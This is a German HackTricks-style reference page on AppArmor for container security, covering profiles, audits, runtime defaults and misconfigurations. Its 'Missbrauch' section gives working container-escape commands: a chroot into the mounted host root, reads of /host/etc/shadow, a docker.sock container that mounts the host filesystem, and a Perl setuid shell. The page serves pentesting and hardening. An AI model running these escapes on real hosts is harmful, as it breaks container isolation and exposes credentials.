# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

AppArmor ist ein **verpflichtendes Zugriffskontrollsystem (Mandatory Access Control)**, das Einschränkungen über pro-Programm-Profile anwendet. Im Gegensatz zu klassischen DAC-Prüfungen, die stark von Benutzer- und Gruppenbesitz abhängen, ermöglicht AppArmor dem Kernel, eine an den Prozess gebundene Richtlinie durchzusetzen. In Container-Umgebungen ist das wichtig, weil ein Workload vielleicht genug traditionelle Privilegien hat, um eine Aktion zu versuchen, aber dennoch abgewiesen wird, weil sein AppArmor-Profil den betreffenden Pfad, Mount, Netzwerkverhalten oder die Nutzung einer capability nicht erlaubt.

Der wichtigste konzeptionelle Punkt ist, dass AppArmor **pfadbasiert** ist. Es bewertet den Zugriff auf das Dateisystem anhand von Pfadregeln statt anhand von Labels, wie es SELinux tut. Das macht es zugänglich und leistungsfähig, bedeutet aber auch, dass bind mounts und alternative Pfadstrukturen besondere Aufmerksamkeit verdienen. Wenn derselbe Host-Inhalt unter einem anderen Pfad erreichbar wird, kann die Wirkung der Richtlinie anders ausfallen, als der Betreiber zunächst erwartet hatte.

## Rolle bei der Container-Isolierung

Container-Sicherheitsprüfungen enden oft bei capabilities und seccomp, aber AppArmor bleibt auch nach diesen Kontrollen relevant. Stell dir einen Container vor, der mehr Privilegien hat, als er sollte, oder einen Workload, der aus betrieblichen Gründen eine zusätzliche capability benötigte. AppArmor kann dennoch Datei-Zugriffe, Mount-Verhalten, Netzwerk- und Ausführungs-Muster einschränken und damit den offensichtlichen Missbrauchspfad unterbinden. Deshalb kann das Deaktivieren von AppArmor "nur damit die Anwendung läuft" eine lediglich riskante Konfiguration still und heimlich in eine aktiv ausnutzbare verwandeln.

## Lab

Um zu prüfen, ob AppArmor auf dem Host aktiv ist, verwende:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Um zu sehen, unter welchem Nutzer der aktuelle Container-Prozess läuft:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Der Unterschied ist lehrreich. Im Normalfall sollte der Prozess einen AppArmor-Kontext anzeigen, der an das vom runtime gewählte profile gebunden ist. Im unconfined-Fall verschwindet diese zusätzliche Einschränkungsschicht.

Sie können auch prüfen, was Docker meint, angewendet zu haben:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Laufzeitnutzung

Docker kann ein Standard- oder ein benutzerdefiniertes AppArmor-Profil anwenden, wenn der Host dies unterstützt. Podman kann sich auf AppArmor-basierten Systemen ebenfalls in AppArmor integrieren, obwohl auf SELinux-first-Distributionen das andere MAC-System oft im Vordergrund steht. Kubernetes kann AppArmor-Policy auf Workload-Ebene auf Nodes aussetzen, die AppArmor tatsächlich unterstützen. LXC und verwandte System-Container-Umgebungen der Ubuntu-Familie nutzen AppArmor ebenfalls intensiv.

Der praktische Punkt ist, dass AppArmor kein "Docker feature" ist. Es ist eine Host-Kernel-Funktion, die mehrere Runtimes anwenden können. Wenn der Host dies nicht unterstützt oder die Runtime angewiesen wird, unconfined zu laufen, ist der vermeintliche Schutz faktisch nicht vorhanden.

Für Kubernetes speziell ist die moderne API `securityContext.appArmorProfile`. Seit Kubernetes `v1.30` sind die älteren Beta-AppArmor-Annotations deprecated. Auf unterstützten Hosts ist `RuntimeDefault` das Standardprofil, während `Localhost` auf ein Profil zeigt, das bereits auf dem Node geladen sein muss. Das ist bei Reviews wichtig, weil ein Manifest AppArmor-bewusst wirken kann, aber trotzdem vollständig von Node-seitiger Unterstützung und vorab geladenen Profilen abhängt.

Ein subtiler, aber nützlicher operativer Punkt ist, dass das explizite Setzen von `appArmorProfile.type: RuntimeDefault` strenger ist als das einfache Weglassen des Feldes. Wenn das Feld explizit gesetzt ist und der Node AppArmor nicht unterstützt, sollte die Zulassung fehlschlagen. Wird das Feld weggelassen, kann die Workload weiterhin auf einem Node ohne AppArmor laufen und erhält einfach diese zusätzliche Einschränkungsschicht nicht. Aus Angreiferperspektive ist das ein guter Grund, sowohl das Manifest als auch den tatsächlichen Node-Zustand zu prüfen.

Auf Docker-fähigen AppArmor-Hosts ist das bekannteste Default `docker-default`. Dieses Profil wird aus Mobys AppArmor-Template generiert und ist wichtig, weil es erklärt, warum einige capability-basierte PoCs in einem Standard-Container trotzdem fehlschlagen. Grob gesagt erlaubt `docker-default` gewöhnliches Networking, verweigert Schreibzugriffe auf große Teile von `/proc`, verweigert Zugriff auf sensitive Bereiche von `/sys`, blockiert Mount-Operationen und schränkt ptrace so ein, dass es kein allgemeines Host-Probing-Primitive ist. Das Verständnis dieser Basislinie hilft, zwischen "the container has `CAP_SYS_ADMIN`" und "the container can actually use that capability against the kernel interfaces I care about" zu unterscheiden.

## Profilverwaltung

AppArmor-Profile werden üblicherweise unter `/etc/apparmor.d/` gespeichert. Eine gängige Namenskonvention besteht darin, Schrägstriche im Pfad der ausführbaren Datei durch Punkte zu ersetzen. Zum Beispiel wird ein Profil für `/usr/bin/man` häufig als `/etc/apparmor.d/usr.bin.man` gespeichert. Dieses Detail ist sowohl für die Verteidigung als auch für die Bewertung wichtig, denn wenn man den aktiven Profilnamen kennt, kann man die entsprechende Datei auf dem Host oft schnell finden.

Nützliche hostseitige Verwaltungsbefehle umfassen:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Der Grund, warum diese Befehle in einer Container-Security-Referenz wichtig sind, ist, dass sie erklären, wie Profile tatsächlich erstellt, geladen, in complain mode gewechselt und nach Änderungen an Anwendungen angepasst werden. Wenn ein Operator die Gewohnheit hat, Profile während der Fehlersuche in complain mode zu versetzen und zu vergessen, enforcement wiederherzustellen, kann der Container in der Dokumentation geschützt aussehen, sich in Wirklichkeit aber deutlich lockerer verhalten.

### Profile erstellen und aktualisieren

`aa-genprof` kann das Verhalten von Anwendungen beobachten und interaktiv beim Erstellen eines Profils helfen:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kann ein Vorlagenprofil erzeugen, das später mit `apparmor_parser` geladen werden kann:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wenn sich das binary ändert und die policy aktualisiert werden muss, kann `aa-logprof` denials in den logs erneut abspielen und den operator dabei unterstützen zu entscheiden, ob sie allow oder deny werden sollen:
```bash
sudo aa-logprof
```
### Protokolle

AppArmor-Zugriffsverweigerungen sind oft in `auditd`, syslog oder Tools wie `aa-notify` sichtbar:
```bash
sudo aa-notify -s 1 -v
```
Dies ist operativ und offensiv nützlich. Verteidiger verwenden es, um Profile zu verfeinern. Angreifer nutzen es, um herauszufinden, welcher genaue Pfad oder welche Operation verweigert wird und ob AppArmor die Kontrolle ist, die eine exploit chain blockiert.

### Identifizierung der genauen Profil-Datei

Wenn eine runtime für einen container einen bestimmten AppArmor-Profilnamen anzeigt, ist es oft nützlich, diesen Namen der Profil-Datei auf der Festplatte zuzuordnen:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Das ist besonders nützlich bei der hostseitigen Überprüfung, weil es die Lücke zwischen "der Container gibt an, unter profile `lowpriv` zu laufen" und "die eigentlichen Regeln liegen in dieser spezifischen Datei, die auditiert oder neu geladen werden kann" schließt.

### Wichtige Regeln zur Prüfung

Wenn Sie ein Profil lesen können, hören Sie nicht bei einfachen `deny`-Zeilen auf. Mehrere Regeltypen verändern maßgeblich, wie nützlich AppArmor gegen einen container escape Versuch sein wird:

- `ux` / `Ux`: führt die Ziel-Binärdatei unconfined aus. Wenn ein erreichbarer helper, shell oder interpreter unter `ux` erlaubt ist, ist das normalerweise das Erste, was man testet.
- `px` / `Px` und `cx` / `Cx`: führen Profilwechsel beim `exec` durch. Diese sind nicht automatisch schlecht, aber sie sind prüfenswert, weil ein Wechsel in ein deutlich breiteres Profil als das aktuelle führen kann.
- `change_profile`: erlaubt einem Task, in ein anderes geladenes Profil zu wechseln, sofort oder beim nächsten `exec`. Wenn das Zielprofil schwächer ist, kann dies zur beabsichtigten Ausstiegsmöglichkeit aus einer restriktiven Domain werden.
- `flags=(complain)`, `flags=(unconfined)`, oder neuer `flags=(prompt)`: diese sollten Ihr Vertrauen in das Profil beeinflussen. `complain` protokolliert Verweigerungen statt sie durchzusetzen, `unconfined` entfernt die Grenze, und `prompt` hängt von einem userspace-Entscheidungsweg ab statt von einer rein kernel-durchgesetzten Verweigerung.
- `userns` oder `userns create,`: neuere AppArmor-Policies können die Erstellung von user namespaces vermitteln. Wenn ein Container-Profil dies explizit erlaubt, bleiben verschachtelte user namespaces in Spiel, selbst wenn die Plattform AppArmor als Teil ihrer Hardening-Strategie verwendet.

Nützliches hostseitiges grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Diese Art von Audit ist oft nützlicher, als Hunderte gewöhnlicher file rules anzustarren. Wenn ein breakout davon abhängt, einen helper auszuführen, einen neuen namespace zu betreten oder in ein weniger restriktives profile zu entkommen, steckt die Antwort häufig in diesen transition-orientierten rules statt in den offensichtlichen `deny /etc/shadow r` style lines.

## Fehlkonfigurationen

Der offensichtlichste Fehler ist `apparmor=unconfined`. Administratoren setzen das oft beim Debugging einer Anwendung, die fehlgeschlagen ist, weil das profile etwas Gefährliches oder Unerwartetes korrekt blockiert hat. Bleibt der Schalter in der Produktivumgebung bestehen, ist die gesamte MAC layer effektiv entfernt.

Ein weiteres subtileres Problem ist die Annahme, dass bind mounts harmlos sind, weil die file permissions normal aussehen. Da AppArmor path-based ist, kann das Freilegen von host paths unter alternativen mount locations schlecht mit path rules interagieren. Ein dritter Fehler ist, zu vergessen, dass ein profile name in einer config file wenig bedeutet, wenn der host kernel AppArmor nicht tatsächlich durchsetzt.

## Missbrauch

Wenn AppArmor fehlt, funktionieren möglicherweise plötzlich Operationen, die zuvor eingeschränkt waren: das Lesen sensibler Pfade über bind mounts, der Zugriff auf Teile von procfs oder sysfs, die eigentlich schwerer zugänglich bleiben sollten, das Ausführen von mount-related actions, wenn capabilities/seccomp dies ebenfalls erlauben, oder die Nutzung von Pfaden, die ein profile normalerweise verbieten würde. AppArmor ist oft der Mechanismus, der erklärt, warum ein capability-based breakout attempt auf dem Papier "should work" aber in der Praxis trotzdem scheitert. Entfernt man AppArmor, kann derselbe Versuch erfolgreich werden.

Wenn du vermutest, dass AppArmor der Hauptgrund ist, der eine path-traversal-, bind-mount- oder mount-based abuse chain stoppt, ist der erste Schritt normalerweise, zu vergleichen, was mit und ohne profile zugänglich wird. Zum Beispiel, wenn ein host path im Container gemountet ist, beginne damit zu prüfen, ob du ihn traversieren und lesen kannst:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Wenn der Container außerdem eine gefährliche Capability wie `CAP_SYS_ADMIN` besitzt, ist einer der praktischsten Tests zu prüfen, ob AppArmor die Kontrolle ist, die Mount-Operationen oder den Zugriff auf empfindliche Kernel-Dateisysteme blockiert:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In Umgebungen, in denen ein host path bereits über einen bind mount verfügbar ist, kann der Verlust von AppArmor ein read-only information-disclosure issue in direkten Zugriff auf Host-Dateien verwandeln:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Der Punkt dieser Befehle ist nicht, dass AppArmor allein den Ausbruch erzeugt. Vielmehr ist es so, dass, sobald AppArmor entfernt ist, viele dateisystem- und mount-basierte Missbrauchspfade sofort testbar werden.

### Vollständiges Beispiel: AppArmor deaktiviert + Host-Root gemountet

Wenn der Container bereits das Host-Root als Bind-Mount unter `/host` eingebunden hat, kann das Entfernen von AppArmor einen zuvor blockierten Dateisystem-Missbrauchspfad in eine vollständige Host-Escape verwandeln:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sobald die shell über das Host-Dateisystem ausgeführt wird, hat die Workload effektiv die Container-Grenze verlassen:
```bash
id
hostname
cat /etc/shadow | head
```
### Vollständiges Beispiel: AppArmor deaktiviert + Runtime Socket

Wenn die eigentliche Barriere AppArmor um den runtime state war, kann ein gemounteter socket ausreichen, um einen vollständigen escape zu ermöglichen:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
### Vollständiges Beispiel: Path-Based Bind-Mount Bypass

Der genaue Pfad hängt vom Mountpunkt ab, aber das Ergebnis ist dasselbe: AppArmor verhindert den Zugriff auf die Runtime-API nicht mehr, und die Runtime-API kann einen Container starten, der den Host kompromittieren kann.

Da AppArmor pfadbasiert ist, schützt eine Regel für `/proc/**` nicht automatisch denselben procfs-Inhalt des Hosts, wenn er über einen anderen Pfad erreichbar ist:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
### Vollständiges Beispiel: Shebang Bypass

Die AppArmor-Policy zielt manchmal auf einen Interpreterpfad ab, ohne die Ausführung von Skripten über die shebang-Verarbeitung vollständig zu berücksichtigen. Ein historisches Beispiel verwendete ein Skript, dessen erste Zeile auf einen eingeschränkten Interpreter verweist:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Dieses Beispiel ist wichtig als Erinnerung daran, dass die beabsichtigte Bedeutung eines profile und die tatsächliche Ausführungssemantik auseinanderfallen können. Beim Überprüfen von AppArmor in container-Umgebungen verdienen interpreter chains und alternative Ausführungspfade besondere Aufmerksamkeit.

## Checks

Ziel dieser Checks ist es, drei Fragen schnell zu beantworten: Ist AppArmor auf dem Host aktiviert, ist der aktuelle Prozess confined, und hat die runtime tatsächlich ein profile auf diesen container angewendet?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Was hier interessant ist:

- Wenn `/proc/self/attr/current` `unconfined` anzeigt, profitiert die Workload nicht von AppArmor-Isolierung.
- Wenn `aa-status` AppArmor als deaktiviert oder nicht geladen anzeigt, ist jeder Profilname in der Runtime-Konfiguration größtenteils kosmetisch.
- Wenn `docker inspect` `unconfined` oder ein unerwartetes benutzerdefiniertes Profil anzeigt, ist das oft der Grund, warum ein auf Dateisystemen oder Mounts basierender Missbrauchspfad funktioniert.
- Wenn `/sys/kernel/security/apparmor/profiles` das erwartete Profil nicht enthält, reicht die Runtime- oder Orchestrator-Konfiguration allein nicht aus.
- Wenn ein angeblich gehärtetes Profil `ux`, breit gefasste `change_profile`-, `userns`- oder `flags=(complain)`-ähnliche Regeln enthält, kann die praktische Grenze deutlich schwächer sein als der Profilname vermuten lässt.

Wenn ein Container aus betrieblichen Gründen bereits erhöhte Privilegien hat, bewirkt das Aktiviertlassen von AppArmor häufig den Unterschied zwischen einer kontrollierten Ausnahme und einem weitaus größeren Sicherheitsversagen.

## Standardwerte der Runtime

| Runtime / Plattform | Standardzustand | Standardverhalten | Gängige manuelle Abschwächungen |
| --- | --- | --- | --- |
| Docker Engine | Auf AppArmor-fähigen Hosts standardmäßig aktiviert | Verwendet das AppArmor-Profil `docker-default`, sofern nicht überschrieben | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Abhängig vom Host | AppArmor wird über `--security-opt` unterstützt, aber der genaue Standard hängt vom Host/Runtime ab und ist weniger universal als Dockers dokumentiertes `docker-default`-Profil | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Bedingter Standard | Wenn `appArmorProfile.type` nicht angegeben ist, ist der Standard `RuntimeDefault`, wird aber nur angewendet, wenn AppArmor auf dem Node aktiviert ist | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` mit einem schwachen Profil, Nodes ohne AppArmor-Unterstützung |
| containerd / CRI-O under Kubernetes | Richtet sich nach der Node/Runtime-Unterstützung | Gängige von Kubernetes unterstützte Runtimes unterstützen AppArmor, aber die tatsächliche Durchsetzung hängt weiterhin von der Node-Unterstützung und den Workload-Einstellungen ab | Wie in der Kubernetes-Zeile; direkte Runtime-Konfiguration kann AppArmor auch vollständig umgehen |

Für AppArmor ist oft der **Host** die wichtigste Variable, nicht nur die Runtime. Eine Profilangabe in einem Manifest schafft keine Isolierung auf einem Node, auf dem AppArmor nicht aktiviert ist.

## Referenzen

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
